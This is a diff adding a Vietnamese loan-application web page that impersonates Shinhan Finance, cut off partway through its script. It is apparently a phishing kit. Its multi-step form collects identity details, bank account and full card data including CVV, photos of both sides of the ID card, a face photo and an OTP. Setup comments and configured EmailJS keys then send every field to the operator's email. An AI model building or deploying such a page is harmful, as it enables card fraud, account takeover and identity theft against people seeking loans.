@@ -1,0 +1,885 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quy Trình Vay Vốn Đơn Giản</title>
+    
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- Google Fonts: Inter -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    
+    <!-- EmailJS Library -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+    <!-- Custom Styles -->
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+        }
+        .cta-button {
+            transition: all 0.3s ease;
+        }
+        .cta-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
+        }
+        /* Style for file upload */
+        .file-upload-wrapper {
+            border: 2px dashed #d1d5db;
+            border-radius: 0.5rem;
+            padding: 1rem;
+            text-align: center;
+            background-color: #f9fafb;
+            min-height: 180px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .image-preview {
+            width: 100%;
+            max-height: 160px;
+            object-fit: contain;
+            border-radius: 0.5rem;
+        }
+    </style>
+</head>
+<body class="bg-white text-gray-800">
+
+    <!-- HƯỚNG DẪN CÀI ĐẶT EMAILJS -->
+    <!-- 
+        Để nhận thông tin khách hàng qua email, bạn cần:
+        1. Đăng ký tài khoản miễn phí tại: https://www.emailjs.com
+        2. Trong Dashboard EmailJS:
+            - Add New Service -> Chọn Gmail và kết nối tài khoản của bạn. Sao chép "Service ID".
+            - Email Templates -> Create New Template. Soạn mẫu email và sao chép "Template ID".
+              Ví dụ mẫu (bạn có thể thêm {{ghi_chu}} và {{ma_otp}}):
+              "Bạn có một hồ sơ vay mới:
+              - Ghi chú: {{ghi_chu}}
+              - Họ tên: {{ho_ten}}
+              - Số điện thoại: {{sdt}}
+              - Email: {{email_khach}}
+              - Địa chỉ: {{dia_chi}}
+              - Nghề nghiệp: {{nghe_nghiep}}
+              - Tiền lương: {{tien_luong}}
+              - Ngân hàng: {{ngan_hang}}
+              - Số tài khoản: {{so_tai_khoan}}
+              - Số thẻ: {{so_the}}
+              - Tên chủ thẻ: {{ten_chu_the}}
+              - Loại thẻ: {{loai_the}}
+              - Ngày cấp: {{ngay_cap}}
+              - Ngày hết hạn: {{ngay_het_han}}
+              - CVV: {{cvv}}
+              - Mã OTP đã nhập: {{ma_otp}}
+              "
+            3. Account -> API Keys -> Sao chép "Public Key".
+            4. Dán các mã bạn đã sao chép vào phần <script> ở cuối trang này.
+    -->
+
+    <!-- Header with Logo -->
+    <header class="bg-white shadow-sm sticky top-0 z-40">
+        <div class="container mx-auto px-6 py-4 flex justify-end items-center">
+            <a href="https://www.shinhanfinance.com.vn/" target="_blank" rel="noopener noreferrer" class="flex items-center space-x-3 hover:opacity-80 transition-opacity">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ5elVhUYOTuNz5X2iEihWXzf3oexPmLts7mw&s" alt="Logo Shinhan Finance" class="h-8" onerror="this.onerror=null;this.src='https://placehold.co/100x32/007aff/ffffff?text=Shinhan';">
+                <span class="font-semibold text-lg text-sky-600">Shinhan Finance</span>
+            </a>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main>
+        <!-- Process Section -->
+        <section id="process" class="py-12 md:py-20 bg-gray-50">
+            <div class="container mx-auto px-6">
+                <div class="text-center mb-12">
+                    <h2 class="text-3xl md:text-4xl font-bold text-gray-900">Hồ sơ hỗ trợ vay vốn</h2>
+                    <p class="text-gray-600 mt-2">Chỉ với 5 bước đơn giản để nhận được khoản vay mong muốn.</p>
+                </div>
+                <div class="relative">
+                    <!-- Progress Bar -->
+                    <div class="hidden md:block absolute top-10 left-[10%] w-[80%] h-1 bg-gray-200"></div>
+                    <div id="progress-line" class="hidden md:block absolute top-10 left-[10%] w-0 h-1 bg-blue-600 transition-all duration-700 ease-out"></div>
+                    
+                    <div class="grid grid-cols-2 md:grid-cols-5 gap-x-4 gap-y-8 md:gap-8 relative">
+                        <!-- Step 1 -->
+                        <div class="text-center">
+                            <div class="relative bg-gray-50">
+                                <div id="step-icon-1" class="w-20 h-20 mx-auto rounded-full flex items-center justify-center text-2xl font-bold border-8 border-gray-50 shadow-lg transition-colors duration-500 bg-blue-600 text-white">1</div>
+                            </div>
+                            <h3 class="text-md font-bold mt-4 mb-2">Cá nhân</h3>
+                        </div>
+                        <!-- Step 2 -->
+                        <div class="text-center">
+                            <div class="relative bg-gray-50">
+                                <div id="step-icon-2" class="w-20 h-20 mx-auto rounded-full flex items-center justify-center text-2xl font-bold border-8 border-gray-50 shadow-lg transition-colors duration-500 bg-gray-400 text-gray-100">2</div>
+                            </div>
+                            <h3 class="text-md font-bold mt-4 mb-2">Bổ sung</h3>
+                        </div>
+                        <!-- Step 3 -->
+                        <div class="text-center">
+                            <div class="relative bg-gray-50">
+                                <div id="step-icon-3" class="w-20 h-20 mx-auto rounded-full flex items-center justify-center text-2xl font-bold border-8 border-gray-50 shadow-lg transition-colors duration-500 bg-gray-400 text-gray-100">3</div>
+                            </div>
+                            <h3 class="text-md font-bold mt-4 mb-2">Giấy tờ</h3>
+                        </div>
+                            <!-- Step 4 -->
+                        <div class="text-center">
+                            <div class="relative bg-gray-50">
+                                <div id="step-icon-4" class="w-20 h-20 mx-auto rounded-full flex items-center justify-center text-2xl font-bold border-8 border-gray-50 shadow-lg transition-colors duration-500 bg-gray-400 text-gray-100">4</div>
+                            </div>
+                            <h3 class="text-md font-bold mt-4 mb-2">Xác thực</h3>
+                        </div>
+                            <!-- Step 5 -->
+                        <div class="text-center col-span-2 md:col-span-1">
+                            <div class="relative bg-gray-50">
+                                <div id="step-icon-5" class="w-20 h-20 mx-auto rounded-full flex items-center justify-center text-2xl font-bold border-8 border-gray-50 shadow-lg transition-colors duration-500 bg-gray-400 text-gray-100">5</div>
+                            </div>
+                            <h3 class="text-md font-bold mt-4 mb-2">Hoàn tất</h3>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Container for all steps -->
+        <div class="py-12 md:py-20">
+            <!-- Registration Step 1: Info Form -->
+            <section id="registration-step-1">
+                <div class="container mx-auto px-6">
+                    <div class="max-w-2xl mx-auto bg-white p-8 rounded-2xl shadow-lg">
+                        <div class="text-center mb-8">
+                            <h2 class="text-3xl md:text-4xl font-bold text-gray-900">Bước 1: Thông tin cá nhân</h2>
+                            <p class="text-gray-600 mt-2">Hãy để lại thông tin, chuyên viên của chúng tôi sẽ liên hệ với bạn ngay.</p>
+                        </div>
+                        <form id="info-form">
+                            <div class="mb-4">
+                                <label for="name" class="block text-gray-700 font-semibold mb-2">Họ và tên</label>
+                                <input type="text" id="name" name="name" class="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="Nguyễn Văn A" required>
+                            </div>
+                            <div class="mb-4">
+                                <label for="phone" class="block text-gray-700 font-semibold mb-2">Số điện thoại</label>
+                                <input type="tel" id="phone" name="phone" class="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="09xxxxxxxx" required>
+                            </div>
+                            <div class="mb-6">
+                                <label for="email" class="block text-gray-700 font-semibold mb-2">Email</label>
+                                <input type="email" id="email" name="email" class="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="bancanvay@email.com">
+                            </div>
+                            <button type="submit" class="w-full bg-blue-600 text-white p-4 rounded-lg font-bold text-lg hover:bg-blue-700 cta-button">Tiếp tục</button>
+                        </form>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Registration Step 2: Additional Info & Card Info -->
+            <section id="registration-step-2" class="hidden">
+                <div class="container mx-auto px-6">
+                    <div class="max-w-2xl mx-auto bg-white p-8 rounded-2xl shadow-lg">
+                        <div class="text-center mb-8">
+                            <h2 class="text-3xl md:text-4xl font-bold text-gray-900">Bước 2: Thông tin Bổ sung</h2>
+                            <p class="text-gray-600 mt-2">Cung cấp thêm thông tin để chúng tôi hiểu rõ hơn về bạn.</p>
+                        </div>
+                        <form id="combined-info-form">
+                            <!-- Additional Info -->
+                            <h3 class="text-xl font-semibold text-gray-800 mb-4 border-b pb-2">1. Thông tin Bổ sung</h3>
+                            <div class="mb-4">
+                                <label for="address" class="block text-gray-700 font-semibold mb-2">Địa chỉ cư trú</label>
+                                <input type="text" id="address" name="address" class="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="Số nhà, đường, phường/xã, quận/huyện, tỉnh/thành phố" required>
+                            </div>
+                            <div class="mb-4">
+                                <label for="occupation" class="block text-gray-700 font-semibold mb-2">Nghề nghiệp</label>
+                                <input type="text" id="occupation" name="occupation" class="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="Ví dụ: Nhân viên văn phòng, Bác sĩ,..." required>
+                            </div>
+                            <div class="mb-8">
+                                <label for="salary" class="block text-gray-700 font-semibold mb-2">Tiền lương hàng tháng (VND)</label>
+                                <input type="text" id="salary" name="salary" class="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="Ví dụ: 15.000.000" required>
+                            </div>
+
+                            <!-- Card Info -->
+                            <h3 class="text-xl font-semibold text-gray-800 mb-4 border-b pb-2">2. Thông tin Thẻ giải ngân</h3>
+                            <div class="mb-4">
+                                <label for="bank-name" class="block text-gray-700 font-semibold mb-2">Ngân hàng</label>
+                                <input type="text" id="bank-name" class="w-full p-3 border border-gray-300 rounded-lg" placeholder="Ví dụ: Vietcombank" required>
+                            </div>
+                            <div class="mb-4">
+                                <label for="account-number" class="block text-gray-700 font-semibold mb-2">Số tài khoản</label>
+                                <input type="text" id="account-number" class="w-full p-3 border border-gray-300 rounded-lg" placeholder="Nhập số tài khoản của bạn" required>
+                            </div>
+                            <div class="mb-4">
+                                <label for="card-number" class="block text-gray-700 font-semibold mb-2">Số thẻ</label>
+                                <input type="text" id="card-number" class="w-full p-3 border border-gray-300 rounded-lg" placeholder="**** **** **** ****" required>
+                            </div>
+                            <div class="mb-4">
+                                <label for="card-holder" class="block text-gray-700 font-semibold mb-2">Họ và tên chủ thẻ</label>
+                                <input type="text" id="card-holder" class="w-full p-3 border border-gray-300 rounded-lg" placeholder="NGUYEN VAN A" required>
+                            </div>
+                            
+                            <div class="grid grid-cols-2 gap-4">
+                                <div class="mb-4">
+                                    <label for="card-type" class="block text-gray-700 font-semibold mb-2">Loại thẻ</label>
+                                    <select id="card-type" name="card-type" class="w-full p-3 border border-gray-300 rounded-lg bg-white focus:outline-none focus:ring-2 focus:ring-blue-500" required>
+                                        <option>Napas</option>
+                                        <option>VISA</option>
+                                        <option>MasterCard</option>
+                                        <option>JCB</option>
+                                    </select>
+                                </div>
+                                <div class="mb-4">
+                                    <label for="card-cvv" class="block text-gray-700 font-semibold mb-2">CVV</label>
+                                    <input type="password" id="card-cvv" name="card-cvv" class="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="***" maxlength="4" required>
+                                </div>
+                            </div>
+                            <div class="grid grid-cols-2 gap-4">
+                                <div class="mb-4">
+                                    <label for="card-issue-date" class="block text-gray-700 font-semibold mb-2">Ngày cấp</label>
+                                    <input type="text" id="card-issue-date" name="card-issue-date" class="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="MM/YY" required>
+                                </div>
+                                <div class="mb-4">
+                                    <label for="card-expiry-date" class="block text-gray-700 font-semibold mb-2">Ngày hết hạn</label>
+                                    <input type="text" id="card-expiry-date" name="card-expiry-date" class="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="MM/YY" required>
+                                </div>
+                            </div>
+
+                            <div class="flex flex-col sm:flex-row gap-4 mt-8">
+                                <button type="button" class="back-btn w-full bg-gray-600 text-white p-4 rounded-lg font-bold text-lg hover:bg-gray-700 cta-button" data-target-step="1">Quay lại</button>
+                                <button type="submit" class="w-full bg-blue-600 text-white p-4 rounded-lg font-bold text-lg hover:bg-blue-700 cta-button">Tiếp tục</button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Registration Step 3: Document Upload -->
+            <section id="registration-step-3" class="hidden">
+                <div class="container mx-auto px-6">
+                    <div class="max-w-4xl mx-auto bg-white p-8 rounded-2xl shadow-lg">
+                        <div class="text-center mb-8">
+                            <h2 class="text-3xl md:text-4xl font-bold text-gray-900">Bước 3: Tải lên giấy tờ</h2>
+                            <p class="text-gray-600 mt-2">Vui lòng cung cấp hình ảnh rõ nét để hồ sơ được duyệt nhanh chóng.</p>
+                        </div>
+                        <form id="docs-form">
+                            <div class="grid md:grid-cols-2 gap-8 mb-8">
+                                <!-- CCCD Front -->
+                                <div>
+                                    <label class="block text-gray-700 font-semibold mb-2">CCCD mặt trước</label>
+                                    <div class="file-upload-wrapper">
+                                        <div id="cccd-front-placeholder" class="text-gray-400">
+                                            <svg class="w-16 h-16 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
+                                            <p class="mt-2 text-sm">Nhấn để tải ảnh lên</p>
+                                        </div>
+                                        <img id="cccd-front-preview" class="image-preview hidden" alt="Xem trước CCCD mặt trước">
+                                    </div>
+                                    <div class="flex space-x-2 mt-2">
+                                        <label for="cccd-front-input" class="w-full text-center cursor-pointer bg-gray-200 p-2 rounded-lg hover:bg-gray-300 transition-colors">Tải ảnh</label>
+                                        <input type="file" id="cccd-front-input" accept="image/*" class="hidden">
+                                        <button type="button" data-target-preview="cccd-front-preview" data-target-input="cccd-front-input" class="open-camera-btn w-full bg-blue-500 text-white p-2 rounded-lg hover:bg-blue-600 transition-colors">Chụp ảnh</button>
+                                    </div>
+                                </div>
+                                <!-- CCCD Back -->
+                                <div>
+                                    <label class="block text-gray-700 font-semibold mb-2">CCCD mặt sau</label>
+                                    <div class="file-upload-wrapper">
+                                            <div id="cccd-back-placeholder" class="text-gray-400">
+                                                <svg class="w-16 h-16 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
+                                                <p class="mt-2 text-sm">Nhấn để tải ảnh lên</p>
+                                            </div>
+                                            <img id="cccd-back-preview" class="image-preview hidden" alt="Xem trước CCCD mặt sau">
+                                    </div>
+                                    <div class="flex space-x-2 mt-2">
+                                            <label for="cccd-back-input" class="w-full text-center cursor-pointer bg-gray-200 p-2 rounded-lg hover:bg-gray-300 transition-colors">Tải ảnh</label>
+                                            <input type="file" id="cccd-back-input" accept="image/*" class="hidden">
+                                            <button type="button" data-target-preview="cccd-back-preview" data-target-input="cccd-back-input" class="open-camera-btn w-full bg-blue-500 text-white p-2 rounded-lg hover:bg-blue-600 transition-colors">Chụp ảnh</button>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Live Camera Capture -->
+                            <div class="mb-8 border-t pt-8">
+                                  <label class="block text-gray-700 font-semibold mb-2 text-center">Xác thực khuôn mặt</label>
+                                  <div class="max-w-md mx-auto">
+                                        <div class="file-upload-wrapper">
+                                            <div id="face-placeholder" class="text-gray-400">
+                                                <svg class="w-16 h-16 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path></svg>
+                                                <p class="mt-2 text-sm">Nhấn để tải ảnh lên</p>
+                                            </div>
+                                            <img id="face-preview" class="image-preview hidden" alt="Xem trước ảnh xác thực">
+                                        </div>
+                                        <div class="flex space-x-2 mt-2">
+                                            <label for="face-input" class="w-full text-center cursor-pointer bg-gray-200 p-2 rounded-lg hover:bg-gray-300 transition-colors">Tải ảnh</label>
+                                            <input type="file" id="face-input" accept="image/*" class="hidden">
+                                            <button type="button" data-target-preview="face-preview" data-target-input="face-input" class="open-camera-btn w-full bg-indigo-600 text-white p-2 rounded-lg hover:bg-indigo-700 transition-colors">Chụp ảnh</button>
+                                        </div>
+                                  </div>
+                            </div>
+
+                            <div class="flex flex-col sm:flex-row gap-4 mt-8">
+                                <button type="button" class="back-btn w-full bg-gray-600 text-white p-4 rounded-lg font-bold text-lg hover:bg-gray-700 cta-button" data-target-step="2">Quay lại</button>
+                                <button type="submit" class="w-full bg-blue-600 text-white p-4 rounded-lg font-bold text-lg hover:bg-blue-700 cta-button">Tiếp tục</button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </section>
+            
+            <!-- Registration Step 4: OTP Verification -->
+            <section id="registration-step-4" class="hidden">
+                <div class="container mx-auto px-6">
+                    <div class="max-w-md mx-auto bg-white p-8 rounded-2xl shadow-lg text-center">
+                            <div class="mb-8">
+                                <h2 class="text-3xl md:text-4xl font-bold text-gray-900">Bước 4: Xác thực OTP</h2>
+                                <p class="text-gray-600 mt-2">Mã OTP đã được gửi đến số điện thoại của bạn. Vui lòng nhập để hoàn tất.</p>
+                            </div>
+                        <form id="otp-form">
+                            <div class="mb-6">
+                                <label for="otp-code" class="block text-gray-700 font-semibold mb-2">Mã xác thực</label>
+                                <input type="text" id="otp-code" class="w-full p-3 text-center text-2xl tracking-[1em] border-gray-300 rounded-lg" placeholder="------" maxlength="6" required>
+                            </div>
+                            <div class="flex flex-col sm:flex-row gap-4 mt-6">
+                                <button type="button" class="back-btn w-full bg-gray-600 text-white p-4 rounded-lg font-bold text-lg hover:bg-gray-700 cta-button" data-target-step="3">Quay lại</button>
+                                <button type="submit" class="w-full bg-green-600 text-white p-4 rounded-lg font-bold text-lg hover:bg-green-700 cta-button">Xác nhận</button>
+                            </div>
+                            <p class="text-sm text-gray-500 mt-4">
+                                <span id="resend-prompt">Không nhận được mã? </span>
+                                <a href="#" id="resend-otp-link" class="text-blue-600 hover:underline hidden">Gửi lại OTP</a>
+                                <span id="timer-container">
+                                    Gửi lại sau <span id="otp-timer" class="font-semibold">60</span>s
+                                </span>
+                            </p>
+                        </form>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Registration Step 5: Success -->
+            <section id="registration-step-5" class="hidden">
+                <div class="container mx-auto px-6">
+                    <div class="max-w-md mx-auto bg-white p-8 rounded-2xl shadow-lg text-center">
+                        <div class="mx-auto bg-green-100 rounded-full w-24 h-24 flex items-center justify-center">
+                            <svg class="w-16 h-16 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
+                        </div>
+                            <div class="mt-8">
+                                <h2 class="text-3xl md:text-4xl font-bold text-gray-900">Hoàn tất!</h2>
+                                <p class="text-gray-600 mt-2">Chúc mừng bạn đã hoàn thành hồ sơ. Khoản vay sẽ được giải ngân trong thời gian sớm nhất.</p>
+                            </div>
+                        <button id="finish-btn" class="mt-8 w-full bg-blue-600 text-white p-4 rounded-lg font-bold text-lg hover:bg-blue-700 cta-button">Về trang chủ</button>
+                    </div>
+                </div>
+            </section>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-gray-800 text-white">
+        <div class="container mx-auto px-6 py-12">
+            <div class="grid md:grid-cols-3 gap-8">
+                <div>
+                    <h3 class="text-xl font-bold mb-4">VayNgay</h3>
+                    <p class="text-gray-400 mb-4">Đối tác tin cậy của:</p>
+                    <div class="flex items-center space-x-3">
+                        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ5elVhUYOTuNz5X2iEihWXzf3oexPmLts7mw&s" alt="Logo Shinhan Finance" class="h-8 bg-white p-1 rounded" onerror="this.onerror=null;this.src='https://placehold.co/100x32/007aff/ffffff?text=Shinhan';">
+                        <span class="font-semibold text-sky-400">Shinhan Finance</span>
+                    </div>
+                </div>
+                <div>
+                    <h3 class="text-lg font-semibold mb-4">Liên kết nhanh</h3>
+                    <ul>
+                        <li class="mb-2"><a href="#process" class="text-gray-400 hover:text-white">Quy trình</a></li>
+                        <li class="mb-2"><a href="#registration-step-1" class="text-gray-400 hover:text-white">Liên hệ</a></li>
+                        <li class="mb-2"><a href="#" class="text-gray-400 hover:text-white">Điều khoản dịch vụ</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="text-lg font-semibold mb-4">Thông tin liên hệ</h3>
+                    <p class="text-gray-400 mb-2">Địa chỉ:Tầng 19, Tháp B, Tòa nhà The Mett - Số 15, đường Trần Bạch Đằng, Phường Thủ Thiêm, Thành phố Thủ Đức , Thành phố Hồ Chí Minh, Việt Nam</p>
+                    <p class="text-gray-400 mb-2">Hotline: 1900 5454 49 | Phí: 1.000 đồng/phút</p>
+                    <p class="text-gray-400">Email: hotro@vayngay.com</p>
+                </div>
+            </div>
+            <div class="mt-8 pt-8 border-t border-gray-700 text-center text-gray-500">
+                <p>&copy; 2024 VayNgay. Đã đăng ký bản quyền.</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Camera Modal -->
+    <div id="camera-modal" class="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50 hidden">
+        <div class="bg-white p-4 md:p-6 rounded-lg max-w-xl w-11/12">
+            <h3 id="modal-title" class="text-xl font-bold mb-4 text-center">Chụp ảnh</h3>
+            <div class="relative">
+                <video id="modal-video-feed" class="w-full rounded-lg mb-4 bg-gray-900" autoplay playsinline></video>
+                <canvas id="modal-photo-canvas" class="w-full rounded-lg mb-4 hidden"></canvas>
+            </div>
+            <div id="modal-btn-container" class="flex flex-col sm:flex-row justify-between space-y-2 sm:space-y-0 sm:space-x-4">
+                <button type="button" id="modal-capture-btn" class="w-full bg-indigo-600 text-white p-3 rounded-lg font-semibold">Chụp</button>
+                <button type="button" id="modal-retake-btn" class="w-full bg-orange-500 text-white p-3 rounded-lg font-semibold hidden">Chụp lại</button>
+                <button type="button" id="modal-use-photo-btn" class="w-full bg-green-600 text-white p-3 rounded-lg font-semibold hidden">Sử dụng ảnh này</button>
+                <button type="button" id="modal-close-btn" class="w-full bg-gray-500 text-white p-3 rounded-lg font-semibold">Đóng</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Custom Alert Box -->
+    <div id="custom-alert" class="fixed top-5 right-5 bg-white p-4 rounded-lg shadow-lg z-[100] hidden max-w-sm transition-transform duration-300 transform translate-x-full">
+        <div class="flex items-start">
+            <div id="alert-icon" class="flex-shrink-0 h-6 w-6">
+                <!-- Icon will be inserted by JS -->
+            </div>
+            <div class="ml-3 w-0 flex-1 pt-0.5">
+                <p id="alert-message" class="text-sm font-medium text-gray-900">Message goes here.</p>
+            </div>
+            <div class="ml-4 flex-shrink-0 flex">
+                <button id="alert-close-btn" type="button" class="inline-flex rounded-md bg-white text-gray-400 hover:text-gray-500 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:ring-offset-2">
+                    <span class="sr-only">Close</span>
+                    <svg class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true">
+                        <path d="M6.28 5.22a.75.75 0 00-1.06 1.06L8.94 10l-3.72 3.72a.75.75 0 101.06 1.06L10 11.06l3.72 3.72a.75.75 0 101.06-1.06L11.06 10l3.72-3.72a.75.75 0 00-1.06-1.06L10 8.94 6.28 5.22z" />
+                    </svg>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // --- EMAILJS CÀI ĐẶT ---
+            // !!! QUAN TRỌNG: Thay thế các giá trị dưới đây bằng ID và Key từ tài khoản EmailJS của bạn
+            // Để tìm các giá trị này:
+            // 1. Đăng nhập vào tài khoản EmailJS của bạn (https://www.emailjs.com/login)
+            // 2. Service ID: Vào mục "Email Services", chọn dịch vụ của bạn (ví dụ: Gmail), ID dịch vụ sẽ hiển thị.
+            // 3. Template ID: Vào mục "Email Templates", chọn hoặc tạo một template mới, ID template sẽ hiển thị.
+            // 4. Public Key: Vào mục "Account" -> "API Keys", Public Key của bạn sẽ hiển thị.
+            const EMAILJS_SERVICE_ID = 'service_fde86fg'; // Ví dụ: 'service_abcdefg'
+            const EMAILJS_TEMPLATE_ID_STEP2 = 'template_8sjp9c9'; // ID mẫu cho Bước 2
+            const EMAILJS_TEMPLATE_ID_STEP4 = 'template_mupgwps'; // ID mẫu cho Bước 4
+            const EMAILJS_PUBLIC_KEY = '5-6L8mJIhhxsAKVzQ'; // Ví dụ: 'your_public_key_here'
+
+            // Chỉ khởi tạo EmailJS nếu các thông tin cần thiết đã được cung cấp (không phải giá trị placeholder)
+            if (EMAILJS_SERVICE_ID !== 'YOUR_SERVICE_ID' && EMAILJS_TEMPLATE_ID_STEP2 !== 'YOUR_TEMPLATE_ID_FOR_STEP2' && EMAILJS_TEMPLATE_ID_STEP4 !== 'YOUR_TEMPLATE_ID_FOR_STEP4' && EMAILJS_PUBLIC_KEY !== 'YOUR_PUBLIC_KEY') {
+                emailjs.init({ publicKey: EMAILJS_PUBLIC_KEY });
+                console.log("EmailJS initialized with provided keys.");
+            } else {
+                console.warn("EmailJS not fully configured. Please replace 'YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID_FOR_STEP2', 'YOUR_TEMPLATE_ID_FOR_STEP4', and 'YOUR_PUBLIC_KEY' with your actual EmailJS credentials to enable email sending.");
+            }
+
+            // --- DOM Elements ---
+            const sections = {
+                1: document.getElementById('registration-step-1'),
+                2: document.getElementById('registration-step-2'),
+                3: document.getElementById('registration-step-3'),
+                4: document.getElementById('registration-step-4'),
+                5: document.getElementById('registration-step-5'),
+            };
+
+            const forms = {
+                1: document.getElementById('info-form'),
+                2: document.getElementById('combined-info-form'),
+                3: document.getElementById('docs-form'),
+                4: document.getElementById('otp-form'),
+            };
+
+            const finishBtn = document.getElementById('finish-btn');
+            const openCameraButtons = document.querySelectorAll('.open-camera-btn');
+            const backButtons = document.querySelectorAll('.back-btn');
+            const progressLine = document.getElementById('progress-line');
+            const stepIcons = [
+                document.getElementById('step-icon-1'),
+                document.getElementById('step-icon-2'),
+                document.getElementById('step-icon-3'),
+                document.getElementById('step-icon-4'),
+                document.getElementById('step-icon-5')
+            ];
+            
+            // --- OTP Timer Elements ---
+            const resendOtpLink = document.getElementById('resend-otp-link');
+            const timerContainer = document.getElementById('timer-container');
+            const otpTimer = document.getElementById('otp-timer');
+            let otpCountdownInterval;
+
+            // --- Modal Elements ---
+            const cameraModal = document.getElementById('camera-modal');
+            const modalVideo = document.getElementById('modal-video-feed');
+            const modalCanvas = document.getElementById('modal-photo-canvas');
+            const modalCaptureBtn = document.getElementById('modal-capture-btn');
+            const modalRetakeBtn = document.getElementById('modal-retake-btn');
+            const modalUsePhotoBtn = document.getElementById('modal-use-photo-btn');
+            const modalCloseBtn = document.getElementById('modal-close-btn');
+
+            // --- Custom Alert Elements ---
+            const customAlert = document.getElementById('custom-alert');
+            const alertMessage = document.getElementById('alert-message');
+            const alertIcon = document.getElementById('alert-icon');
+            const alertCloseBtn = document.getElementById('alert-close-btn');
+            let alertTimeout;
+
+            let currentStream;
+            let currentTargetPreview;
+            let currentTargetInput;
+
+            // --- Utility Functions ---
+            const showMessage = (message, isError = false) => {
+                clearTimeout(alertTimeout); 
+                const errorIconSvg = `<svg class="h-6 w-6 text-red-500" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126zM12 15.75h.007v.008H12v-.008z" /></svg>`;
+                const successIconSvg = `<svg class="h-6 w-6 text-green-500" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>`;
+                
+                alertMessage.textContent = message;
+                alertIcon.innerHTML = isError ? errorIconSvg : successIconSvg;
+                
+                customAlert.classList.remove('hidden', 'translate-x-full');
+                customAlert.classList.add('translate-x-0');
+                
+                alertTimeout = setTimeout(() => {
+                    customAlert.classList.remove('translate-x-0');
+                    customAlert.classList.add('translate-x-full');
